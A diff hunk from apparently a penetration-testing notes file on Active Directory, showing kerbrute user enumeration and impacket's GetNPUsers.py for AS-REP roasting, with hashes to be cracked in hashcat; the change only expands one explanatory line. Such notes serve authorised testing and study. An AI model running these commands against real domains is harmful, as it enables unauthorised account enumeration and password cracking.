@@ -6,7 +6,7 @@
 
     ./kerbrute userenum userlist.txt -d [name] --dc [name]     
 
-Get a list of valid users: ASREProasting to see if any of them do not have pre-auth set. Crack hashes with hashcat        
+Get a list of valid users: ASREProasting to see if any of them do not have pre-auth set and can request a Kerberos ticket without a password. Crack hashes with hashcat        
 
     python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.local/ -no-pass -usersfile users.txt         
     
